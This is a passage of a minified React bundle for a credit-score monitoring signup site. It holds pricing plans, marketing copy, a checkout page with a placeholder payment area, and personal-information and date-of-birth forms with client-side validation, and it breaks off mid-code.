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",B5=()=>{const t=cr(),[e,n]=O.useState(null),i=[{id:1,title:"Standard Quarterly Plan",price:"119.85",cycle:"Previous 3 months",setup:"",isBestValue:!0},{id:2,title:"Basic Monthly Plan",price:"39.95",cycle:"Previous month",setup:"+$3 Setup fee",isBestValue:!0},{id:3,title:"Premium Semi-Annual Plan",originalPrice:"239.70",price:"199.00",cycle:"Previous 6 months",setup:"",isBestValue:!0,hasDiscount:!0}],s=o=>{n(o),t("/checkout",{state:{selectedPlan:o}})};return g.jsxs("div",{className:"py-10 px-4 bg-white w-full md:w-[85%] lg:w-[70%] mx-auto mt-12",children:[g.jsxs("div",{className:"text-center mb-8",children:[g.jsx("h2",{className:"text-2xl sm:text-3xl md:text-4xl text-[#333333] font-bold",children:"Choose your pricing plan"}),g.jsx("p",{className:"text-sm sm:text-base text-gray-600",children:"Find one that works for you"})]}),g.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6",children:i.map(o=>g.jsxs("div",{className:"bg-white shadow-md border border-black rounded-md overflow-hidden flex flex-col justify-between",children:[g.jsxs("div",{className:"relative",children:[g.jsx("img",{src:U5,alt:"card",className:"w-full h-[140px] sm:h-[160px] object-cover"}),o.isBestValue&&g.jsx("span",{className:"absolute bottom-[-10px] left-1/2 transform -translate-x-1/2 bg-blue-600 text-white text-[12px] sm:text-[13px] px-3 py-[2px] font-bold rounded",children:"Best Value"})]}),g.jsxs("div",{className:"p-4 sm:p-6 text-center flex flex-col justify-between gap-4 flex-grow",children:[g.jsxs("div",{children:[g.jsx("h3",{className:"text-base sm:text-lg font-semibold mb-1",children:o.title}),o.hasDiscount?g.jsxs("div",{className:"mb-1",children:[g.jsxs("div",{className:"relative inline-block",children:[g.jsxs("span",{className:"text-2xl sm:text-3xl font-bold text-gray-400",children:[g.jsx("span",{className:"text-sm align-top",children:"$"}),o.originalPrice]}),g.jsx("div",{className:"absolute top-1/2 left-0 w-full h-0.5 bg-red-500 transform -translate-y-1/2"})]}),g.jsxs("div",{className:"text-4xl sm:text-5xl md:text-6xl font-bold text-red-600 mt-2",children:[g.jsx("span",{className:"text-base sm:text-xl align-top",children:"$"}),o.price]}),g.jsxs("div",{className:"bg-red-100 text-red-600 text-xs sm:text-sm font-bold px-2 py-1 rounded-full inline-block mt-1",children:["SAVE $",(parseFloat(o.originalPrice)-parseFloat(o.price)).toFixed(2)]})]}):g.jsxs("div",{className:"text-4xl sm:text-5xl md:text-6xl font-bold text-gray-900 mb-1",children:[g.jsx("span",{className:"text-base sm:text-xl align-top",children:"$"}),o.price]}),g.jsx("p",{className:"text-gray-600 text-sm",children:o.cycle}),o.setup&&g.jsx("p",{className:"text-gray-500 text-sm",children:o.setup})]}),g.jsxs("div",{children:[g.jsx("p",{className:"text-sm text-gray-500 mb-2",children:"Valid until canceled"}),g.jsx("button",{onClick:()=>s(o),className:"bg-blue-600 text-white px-4 py-2 sm:px-6 sm:py-2 rounded w-full cursor-pointer",children:"Select"}),g.jsx("div",{className:"border-t border-gray-200 my-3"}),g.jsxs("div",{className:"flex items-center justify-center gap-2 mt-3 text-sm text-gray-600",children:[g.jsx(M5,{}),g.jsx("span",{children:"Credit score"})]})]})]})]},o.id))}),g.jsx("div",{className:"text-center text-sm text-gray-500 mt-8 underline cursor-pointer",children:"Add terms and conditions"})]})};function Xy(t){return Pt({attr:{viewBox:"0 0 24 24"},child:[{tag:"path",attr:{fill:"none",d:"M0 0h24v24H0V0z"},child:[]},{tag:"path",attr:{d:"m19.77 5.03 1.4 1.4L8.43 19.17l-5.6-5.6 1.4-1.4 4.2 4.2L19.77 5.03m0-2.83L8.43 13.54l-4.2-4.2L0 13.57 8.43 22 24 6.43 19.77 2.2z"},child:[]}]})(t)}const z5="/assets/img-lp-scores-BmgGaiAN.avif",F5=()=>g.jsxs("div",{className:"w-[90%] md:w-[70%] mx-auto flex flex-col justify-center items-center gap-6 py-10",children:[g.jsxs("div",{className:"flex flex-col text-center gap-2 leading-tight",children:[g.jsx("p",{className:"cus_font2 text-3xl sm:text-5xl md:text-7xl text-white",children:"See Your Credit Score instantly!"}),g.jsx("p",{className:"text-xl sm:text-2xl md:text-4xl text-white",children:"Check your Credit Score and monitor your credit now"})]}),g.jsxs("div",{className:"flex flex-col sm:flex-row flex-wrap justify-center items-center gap-2 text-white text-center",children:[g.jsxs("div",{className:"flex items-center gap-1",children:[g.jsx(Xy,{className:"text-2xl sm:text-3xl"}),g.jsx("p",{className:"text-sm sm:text-base",children:"7 days Trial with $1.00 Processing Fee"})]}),g.jsxs("div",{className:"flex items-center gap-1",children:[g.jsx(Xy,{className:"text-2xl sm:text-3xl"}),g.jsx("p",{className:"text-sm sm:text-base",children:"Monthly membership of $39.95 after Trial"})]}),g.jsxs("div",{className:"flex items-center gap-1",children:[g.jsx(Xy,{className:"text-2xl sm:text-3xl"}),g.jsx("p",{className:"text-sm sm:text-base",children:"To cancel, simply call +1315 250 0236"})]})]}),g.jsxs("div",{className:"flex flex-col md:flex-row justify-center items-center gap-4",children:[g.jsx("div",{className:"w-[200px] sm:w-[300px] md:w-[350px]",children:g.jsx("img",{src:z5,alt:"Credit Score Banner",className:"w-full h-auto"})}),g.jsx("div",{className:"text-xl sm:text-2xl md:text-4xl text-[#ff8c4f] cus_font2 text-center md:text-left",children:"Get Your Credit Score Now!"})]})]}),H5=()=>g.jsx("div",{className:"for_bg_image py-10",children:g.jsxs("div",{children:[g.jsx(F5,{}),g.jsx(B5,{}),g.jsx(CT,{})]})}),q5="/assets/img-lp-couple_edited-3iHcYhEn.avif",G5=()=>g.jsx("div",{className:"bg-white  px-4 lg:px-20",children:g.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-10 items-start",children:[g.jsxs("div",{className:"bg-blue-100 p-8 rounded-md shadow-md text-center",children:[g.jsxs("h2",{className:"text-2xl lg:text-4xl font-semibold text-[#008afc] cus_font2 mb-4",children:["What can a good Credit ",g.jsx("br",{})," Score do for you?"]}),g.jsx("p",{className:"text-gray-700 text-sm mb-6",children:"Having a good credit score can mean lower interest rates on home and auto purchases, big savings on insurance premiums, and even increase employment chances! We let you see your score instantly to see where you stand, while also allowing you to verify accuracy and monitor your credit report for changes."}),g.jsx("img",{src:q5,alt:"family",className:"mx-auto mb-6 w-56 h-auto object-contain"}),g.jsx("p",{className:"text-sm text-gray-800 mb-4",children:"Check your Credit Score and monitor your credit now. Let your users understand the importance of a good credit score and how it can impact their financial well-being."}),g.jsx("button",{className:"px-5 py-2 border border-gray-700 text-gray-800 rounded hover:bg-blue-600 hover:text-white transition duration-300",children:"Check Now"})]}),g.jsxs("div",{children:[g.jsxs("h2",{className:"text-2xl lg:text-4xl font-semibold text-[#008afc] mb-4 text-center lg:text-left cus_font2",children:["Get more than automatic ",g.jsx("br",{})," credit monitoring:"]}),g.jsxs("ul",{className:"list-disc text-gray-800 pl-5 space-y-2 text-sm",children:[g.jsx("li",{children:"Unlimited access to your credit score"}),g.jsx("li",{children:"Email alerts of activity in your name"}),g.jsx("li",{children:"Comprehensive credit learning center"}),g.jsx("li",{children:"Toll free access to Customer Service"}),g.jsx("li",{children:"And much more!"})]})]})]})}),Y5=()=>g.jsxs("div",{className:"max-w-4xl mx-auto px-4 py-10 text-[#1d1d1d]",children:[g.jsx("h1",{className:"text-3xl font-bold mb-10",children:"Protection For Your Credit"}),g.jsxs("div",{className:"flex gap-4 mb-10",children:[g.jsx("div",{className:"text-blue-500 text-5xl",children:g.jsx(b5,{})}),g.jsxs("div",{children:[g.jsx("h2",{className:"text-xl font-bold text-blue-600 mb-2",children:"Your Credit Score"}),g.jsxs("p",{className:"mb-2",children:["Do you know your Credit Score?",g.jsx("br",{}),"YOU SHOULD."]}),g.jsx("p",{className:"mb-2",children:"Its one of the most important tools for your financial health. A good Credit Score helps lower your payments for mortgages, car payments, credit cards, insurance premiums and more."}),g.jsxs("p",{className:"mb-2",children:["Once you ",g.jsx("span",{className:"text-blue-600 underline cursor-pointer",children:"signed up"}),", well pull your Credit Score and show where you stand."]}),g.jsx("p",{className:"mb-2",children:"Youll see how it changes month after month, and our credit expert system will provide personalized information on what is impacting your Score."}),g.jsx("p",{children:"Plus, weve made it safe and secure, so checking your Credit Score will NOT lower your Score! Your Credit Report is safe too."})]})]}),g.jsxs("div",{className:"flex gap-4 mb-10",children:[g.jsx("div",{className:"text-blue-500 text-5xl",children:g.jsx(T5,{})}),g.jsxs("div",{children:[g.jsx("h2",{className:"text-xl font-bold text-blue-600 mb-2",children:"Your Credit Report"}),g.jsxs("p",{className:"mb-2",children:["Just knowing your Score is not enough.",g.jsx("br",{}),"If you want to control your financial future, youll want to review your full Credit Report. Youll see what lenders see when youre buying a new car, buying a home or applying for a loan."]}),g.jsx("p",{className:"mb-2",children:"Credit Reports are even reviewed for job offers and apartment rentals. With your Credit Report, youll see a list of accounts, account balances, late payments, credit inquiries and more."}),g.jsx("p",{children:"Youll also get email alerts for every key change like new accounts and late payments."})]})]}),g.jsxs("div",{className:"flex gap-4",children:[g.jsx("div",{className:"text-blue-500 text-5xl",children:g.jsx(Rv,{})}),g.jsxs("div",{children:[g.jsx("h2",{className:"text-xl font-bold text-blue-600 mb-2",children:"Your Identity Protection"}),g.jsx("p",{className:"mb-2",children:"Over 8 million Americans are victims of credit attacks each year."}),g.jsx("p",{className:"mb-2",children:"Identity thieves can access your bank accounts, get new credit cards and even buy a home -- all using your good name and credit."}),g.jsx("p",{className:"mb-2",children:"They abandon the scene and leave a path of destruction, leaving you to clean up the mess -- and your credit. Were here to make sure you survive these attacks."}),g.jsx("p",{className:"mb-2",children:"Youll receive a complete suite of credit and identity protection tools to monitor your bank accounts, credit cards, social security number and more."}),g.jsxs("p",{children:["Well even pay up to ",g.jsx("strong",{children:"$1,000,000"})," in expenses to help you restore your identity."]})]})]})]}),Q5=()=>g.jsx("div",{className:" pb-8",children:g.jsxs("div",{children:[g.jsx(H5,{}),g.jsx(CT,{}),g.jsx(G5,{}),g.jsx(Y5,{}),g.jsx(V5,{})]})}),K5=()=>{const t=bi(),{selectedPlan:e}=t.state||{};if(!e)return g.jsxs("div",{className:"p-8 text-center",children:[g.jsx("h2",{className:"text-2xl font-bold mb-4",children:"No plan selected"}),g.jsx("p",{children:"Please go back and select a pricing plan."})]});const n=e.setup?parseFloat(e.price)+3:parseFloat(e.price);return g.jsxs("div",{className:"max-w-6xl mx-auto p-6 min-h-screen",children:[g.jsxs("div",{className:"flex items-baseline gap-2 text-2xl font-semibold text-gray-800",children:[g.jsx("h1",{className:"text-gray-600 ",children:"Total:"}),g.jsxs("span",{className:"text-blue-600 text-xl tracking-wide",children:["$",n.toFixed(2)]})]}),g.jsx("div",{className:"mb-10",children:g.jsx("hr",{})}),g.jsxs("div",{className:"flex flex-col lg:flex-row gap-1 md:gap-8",children:[g.jsx("div",{className:"lg:w-2/3 ",children:g.jsxs("div",{className:"bg-white shadow-md rounded-lg p-6 mb-6",children:[g.jsx("h2",{className:"text-xl font-semibold mb-6",children:"Payment Information"}),g.jsxs("div",{className:"space-y-4",children:[g.jsx("div",{className:"border border-gray-300 rounded-lg p-4",children:g.jsx("p",{className:"text-gray-600 mb-2",children:"Payment method will go here"})}),g.jsxs(Yr,{to:"/provide-your-info",state:{from:"/checkout"},className:"bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 md:py-4 rounded-lg w-full font-medium text-lg flex items-center justify-center gap-2",children:[g.jsx(TT,{className:"text-white"}),"Pay $",n.toFixed(2)]}),g.jsxs("div",{className:"flex items-center justify-center gap-2 text-gray-600 text-sm",children:[g.jsx(Rv,{className:"text-green-500"}),g.jsx("span",{children:"Secure Payment"})]})]})]})}),g.jsx("div",{className:"lg:w-1/3 border-gray-300 border-1",children:g.jsxs("div",{className:"bg-white shadow-md rounded-lg p-6 sticky top-6",children:[g.jsx("h2",{className:"text-xl font-semibold mb-4 border-b pb-2",children:"Order Summary"}),g.jsxs("div",{className:"space-y-4",children:[g.jsxs("div",{className:"flex justify-between",children:[g.jsx("span",{className:"font-medium text-gray-600",children:"Plan:"}),g.jsx("span",{className:"font-medium",children:e.title})]}),g.jsxs("div",{className:"flex justify-between",children:[g.jsx("span",{className:"font-medium text-gray-600",children:"Price:"}),g.jsxs("span",{children:["$",e.price]})]}),g.jsxs("div",{className:"flex justify-between",children:[g.jsx("span",{className:"font-medium text-gray-600",children:"Billing Cycle:"}),g.jsx("span",{children:e.cycle})]}),e.setup&&g.jsxs("div",{className:"flex justify-between",children:[g.jsx("span",{className:"font-medium text-gray-600",children:"Setup Fee:"}),g.jsx("span",{children:"$3.00"})]}),g.jsx("div",{className:"bg-blue-50 border-l-4 border-blue-500 p-3 rounded",children:g.jsxs("p",{className:"text-blue-700 font-medium flex items-center",children:[g.jsx("svg",{className:"w-4 h-4 mr-2",fill:"currentColor",viewBox:"0 0 20 20",children:g.jsx("path",{fillRule:"evenodd",d:"M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z",clipRule:"evenodd"})}),"Refundable within 24 hours"]})}),g.jsx("div",{className:"border-t border-gray-200 pt-4 mt-2",children:g.jsxs("div",{className:"flex justify-between font-bold text-lg",children:[g.jsx("span",{children:"Total:"}),g.jsxs("span",{children:["$",n.toFixed(2)]})]})})]}),g.jsx("div",{className:"mt-6 pt-4 border-t border-gray-200",children:g.jsx("p",{className:"text-sm text-gray-500",children:"By completing your purchase, you agree to our Terms of Service and Privacy Policy."})})]})})]})]})},ST="/assets/img-score-and-more-7773-Adp.svg",kv="/assets/img-seal-qualys-2D4QEH7m.svg",Dv="/assets/images-C-nvlNA4.png",W5=()=>{const t=cr(),[e,n]=O.useState({firstName:"",lastName:"",phone:"",email:"",address:"",apartment:"",zip:"",city:"",state:""}),[i,s]=O.useState({}),[o,c]=O.useState({}),d=w=>{const{name:E,value:C}=w.target;if(E==="phone"){const M=C.replace(/[^0-9]/g,"");n(V=>({...V,[E]:M}))}else n(M=>({...M,[E]:C}));i[E]&&s(M=>({...M,[E]:""}))},f=w=>{const{name:E}=w.target;c(C=>({...C,[E]:!0})),p(E,e[E])},p=(w,E)=>{let C="";if(!E.trim())C="This field is required";else switch(w){case"email":/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(E)||(C="Invalid email address");break;case"phone":E.replace(/\D/g,"").length<4&&(C="Phone number must be at least 4 digits");break;case"zip":/^\d{5}(-\d{4})?$/.test(E)||(C="Invalid ZIP code");break}return s(M=>({...M,[w]:C})),!C},v=()=>{let w=!0;const E={};return Object.keys(e).forEach(C=>{e[C].trim()?C==="email"&&!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e[C])?(E[C]="Invalid email address",w=!1):C==="phone"&&e[C].replace(/\D/g,"").length<4?(E[C]="Phone number must be at least 4 digits",w=!1):C==="zip"&&!/^\d{5}(-\d{4})?$/.test(e[C])&&(E[C]="Invalid ZIP code",w=!1):(E[C]="This field is required",w=!1)}),s(E),w},b=w=>{w.preventDefault(),v()&&t("/secure-access",{state:{from:"/provide-your-info",formData:e}})};return g.jsxs("div",{className:"flex flex-col lg:flex-row max-w-6xl mx-auto shadow-lg rounded-lg overflow-hidden mt-3 md:mt-10 font-sans bg-white mb-6",children:[g.jsxs("div",{className:"w-full lg:w-[60%] p-6 md:p-8",children:[g.jsxs("div",{className:"mb-6",children:[g.jsx("h2",{className:"text-xl md:text-2xl font-semibold text-gray-800 mb-1",children:"Provide your information to locate your credit file."}),g.jsx("p",{className:"text-sm text-gray-600",children:"Know where your credit stands with lenders."})]}),g.jsx("div",{className:"mb-4",children:g.jsx("p",{className:"text-xs font-medium text-gray-500 uppercase tracking-wider",children:"Step 1. Create Your Account"})}),g.jsxs("form",{onSubmit:b,children:[g.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4 mb-4",children:[g.jsxs("div",{children:[g.jsx("label",{className:"block text-xs font-medium text-gray-500 mb-1",children:"First Name*"}),g.jsx("input",{type:"text",name:"firstName",className:`border ${i.firstName?"border-red-500":"border-gray-300"} p-1 rounded w-full bg-gray-50`,value:e.firstName,onChange:d,onBlur:f}),i.firstName&&o.firstName&&g.jsx("p",{className:"text-red-500 text-xs mt-1",children:i.firstName})]}),g.jsxs("div",{children:[g.jsx("label",{className:"block text-xs font-medium text-gray-500 mb-1",children:"Last Name*"}),g.jsx("input",{type:"text",name:"lastName",className:`border ${i.lastName?"border-red-500":"border-gray-300"} p-1 rounded w-full bg-gray-50`,value:e.lastName,onChange:d,onBlur:f}),i.lastName&&o.lastName&&g.jsx("p",{className:"text-red-500 text-xs mt-1",children:i.lastName})]}),g.jsxs("div",{children:[g.jsx("label",{className:"block text-xs font-medium text-gray-500 mb-1",children:"Phone*"}),g.jsx("input",{type:"tel",name:"phone",className:`border ${i.phone?"border-red-500":"border-gray-300"} p-1 rounded w-full bg-gray-50`,value:e.phone,onChange:d,onBlur:f}),i.phone&&o.phone&&g.jsx("p",{className:"text-red-500 text-xs mt-1",children:i.phone})]}),g.jsxs("div",{children:[g.jsx("label",{className:"block text-xs font-medium text-gray-500 mb-1",children:"Email*"}),g.jsx("input",{type:"text",name:"email",className:`border ${i.email?"border-red-500":"border-gray-300"} p-1 rounded w-full bg-gray-50`,value:e.email,onChange:d,onBlur:f,placeholder:"example@email.com"}),i.email&&o.email&&g.jsx("p",{className:"text-red-500 text-xs mt-1",children:i.email})]}),g.jsxs("div",{children:[g.jsx("label",{className:"block text-xs font-medium text-gray-500 mb-1",children:"Address*"}),g.jsx("input",{type:"text",name:"address",className:`border ${i.address?"border-red-500":"border-gray-300"} p-1 rounded w-full bg-gray-50`,value:e.address,onChange:d,onBlur:f}),i.address&&o.address&&g.jsx("p",{className:"text-red-500 text-xs mt-1",children:i.address})]}),g.jsxs("div",{children:[g.jsx("label",{className:"block text-xs font-medium text-gray-500 mb-1",children:"Apartment"}),g.jsx("input",{type:"text",name:"apartment",className:"border border-gray-300 p-1 rounded w-full bg-gray-50",value:e.apartment,onChange:d})]}),g.jsxs("div",{children:[g.jsx("label",{className:"block text-xs font-medium text-gray-500 mb-1",children:"Zip*"}),g.jsx("input",{type:"text",name:"zip",className:`border ${i.zip?"border-red-500":"border-gray-300"} p-1 rounded w-full bg-gray-50`,value:e.zip,onChange:d,onBlur:f,placeholder:"12345 or 12345-6789"}),i.zip&&o.zip&&g.jsx("p",{className:"text-red-500 text-xs mt-1",children:i.zip})]}),g.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[g.jsxs("div",{children:[g.jsx("label",{className:"block text-xs font-medium text-gray-500 mb-1",children:"City*"}),g.jsx("input",{type:"text",name:"city",className:`border ${i.city?"border-red-500":"border-gray-300"} p-1 rounded w-full bg-gray-50`,value:e.city,onChange:d,onBlur:f}),i.city&&o.city&&g.jsx("p",{className:"text-red-500 text-xs mt-1",children:i.city})]}),g.jsxs("div",{children:[g.jsx("label",{className:"block text-xs font-medium text-gray-500 mb-1",children:"State*"}),g.jsx("input",{type:"text",name:"state",className:`border ${i.state?"border-red-500":"border-gray-300"} p-1 rounded w-full bg-gray-50`,value:e.state,onChange:d,onBlur:f}),i.state&&o.state&&g.jsx("p",{className:"text-red-500 text-xs mt-1",children:i.state})]})]})]}),g.jsx("div",{className:"flex justify-center",children:g.jsx("button",{type:"submit",className:"bg-[#7fbdff] hover:bg-blue-700 text-white py-2 px-21 rounded mb-4 font-medium w-full md:w-auto text-[13px] cursor-pointer",children:"CONTINUE"})})]}),g.jsxs("p",{className:"text-xs text-gray-500 mb-4",children:["By clicking the button, I agree to the"," ",g.jsx("a",{href:"#",className:"text-blue-600 underline",children:"Terms and Conditions"})," ","and consent to receive recurring automated and prerecorded informational and marketing messages at the number I provided above via call and text from and on behalf of CashCenter all. I understand that consent is not a condition to purchase and can call (800) 538-6160 to purchase."]}),g.jsxs("div",{className:"flex flex-wrap items-center justify-center gap-4 mt-4",children:[g.jsx("img",{src:Dv,alt:"Verified Secure",className:"h-8"}),g.jsx("img",{src:kv,alt:"Qualys Security Scan",className:"h-8"})]})]}),g.jsx("div",{className:"w-full lg:w-[40%] bg-gray-300 p-6 md:p-8 flex flex-col",children:g.jsxs("div",{className:"flex-grow flex flex-col items-center justify-center",children:[g.jsxs("div",{className:"relative mb-6",children:[g.jsx("div",{className:"absolute -top-2 -right-2 bg-white rounded-full p-2 shadow-md",children:g.jsx("div",{className:"bg-blue-100 rounded-full p-3",children:g.jsx("span",{className:"text-blue-600 font-bold text-xl",children:"723"})})}),g.jsx("img",{src:ST,alt:"Credit Score Illustration",className:"w-64 mx-auto"})]}),g.jsx("h3",{className:"text-lg font-semibold text-[#7e8284] mb-4 text-center",children:"Get your credit score and get protected too."}),g.jsxs("ul",{className:"space-y-3 w-full max-w-xs",children:[g.jsxs("li",{className:"flex items-start",children:[g.jsx("span",{className:"inline-flex items-center justify-center border-2 border-gray-500 rounded-full h-5 w-5 mt-1 mr-2 flex-shrink-0",children:g.jsx(Is,{className:"text-gray-500 text-xs"})}),g.jsx("span",{className:"text-[#7e8284] text-[14px]",children:"Credit Report and Score"})]}),g.jsxs("li",{className:"flex items-start",children:[g.jsx("span",{className:"inline-flex items-center justify-center border-2 border-gray-500 rounded-full h-5 w-5 mt-1 mr-2 flex-shrink-0",children:g.jsx(Is,{className:"text-gray-500 text-xs"})}),g.jsx("span",{className:"text-[#7e8284] text-[14px]",children:"Score Refreshed Every 30 Days On Sign In"})]}),g.jsxs("li",{className:"flex items-start",children:[g.jsx("span",{className:"inline-flex items-center justify-center border-2 border-gray-500 rounded-full h-5 w-5 mt-1 mr-2 flex-shrink-0",children:g.jsx(Is,{className:"text-gray-500 text-xs"})}),g.jsx("span",{className:"text-[#7e8284] text-[14px]",children:"Credit Monitoring and Alerts"})]}),g.jsxs("li",{className:"flex items-start",children:[g.jsx("span",{className:"inline-flex items-center justify-center border-2 border-gray-500 rounded-full h-5 w-5 mt-1 mr-2 flex-shrink-0",children:g.jsx(Is,{className:"text-gray-500 text-xs"})}),g.jsx("span",{className:"text-[#7e8284] text-[14px]",children:"Credit Cards and Loans Matched for You"})]})]})]})})]})},$5="/assets/img-check-score-Dndu1lLp.png",X5="data:image/svg+xml,%3csvg%20id='Layer_1'%20data-name='Layer%201'%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20512%20511.9'%3e%3cdefs%3e%3cstyle%3e.cls-1{fill:%23c5c5c5;}.cls-2{fill:%230e7be1;}%3c/style%3e%3c/defs%3e%3ctitle%3esecurity-flat%3c/title%3e%3cpath%20class='cls-1'%20d='M0,452H135.9A241.39,241.39,0,0,1,93.6,315.1V240.6l11.4-2.8a63.44,63.44,0,0,0,46.1-46.1l2.8-11.4H358.1l2.8,11.4A63.44,63.44,0,0,0,407,237.8l11.4,2.8V315a241.39,241.39,0,0,1-42.3,136.9H512V150.1H0Z'/%3e%3cpath%20class='cls-1'%20d='M0,0V120.1H512V0ZM90.1,75H60V45H90l.1,30Zm60,0h-30V45h30Zm60.1,0h-30V45h30Zm263.3.4H297.9a15.09,15.09,0,0,1-15.1-15.1h0a15.09,15.09,0,0,1,15.1-15.1H473.4a15.09,15.09,0,0,1,15.1,15.1h0A15,15,0,0,1,473.5,75.4Z'/%3e%3cpath%20class='cls-2'%20d='M335.3,210.1H176.7a92,92,0,0,1-53.1,53.1V315A212.54,212.54,0,0,0,256.1,511.9,212.54,212.54,0,0,0,388.6,315V263.2A91.81,91.81,0,0,1,335.3,210.1Zm-79.3,64a54.21,54.21,0,0,1,15,106.3v45.9H241V380.4a54.21,54.21,0,0,1,15-106.3Z'/%3e%3cpath%20class='cls-2'%20d='M256,352.5a24.2,24.2,0,1,0-24.2-24.2A24.28,24.28,0,0,0,256,352.5Z'/%3e%3c/svg%3e",Z5=()=>{const t=cr(),[e,n]=O.useState(""),[i,s]=O.useState(""),[o,c]=O.useState(""),[d,f]=O.useState(""),[p,v]=O.useState(""),[b,w]=O.useState(""),[E,C]=O.useState(""),[M,V]=O.useState(""),[B,Y]=O.useState(!1),[D,Q]=O.useState(!0),[G,L]=O.useState({month:"",day:"",year:"",password:"",confirmPassword:"",form:""}),N=new Date().getFullYear(),T=B,k=D,I=_e=>{Y(_e.target.checked),Q(!_e.target.checked)},j=_e=>{Q(_e.target.checked),Y(!_e.target.checked)},z=()=>{if(!B)return!0;const _e={...G,month:"",day:"",year:""};let he=!0;if((d===""||isNaN(d)||parseInt(d)<1||parseInt(d)>12)&&(_e.month="Enter a valid month (01-12)",he=!1),p===""||isNaN(p))_e.day="Enter a valid day",he=!1;else{let it=31;if(d==="04"||d==="06"||d==="09"||d==="11")it=30;else if(d==="02"){const gt=b?parseInt(b):N;it=gt%4===0&&gt%100!==0||gt%400===0?29:28}(parseInt(p)<1||parseInt(p)>it)&&(_e.day=`Day must be between 01 and 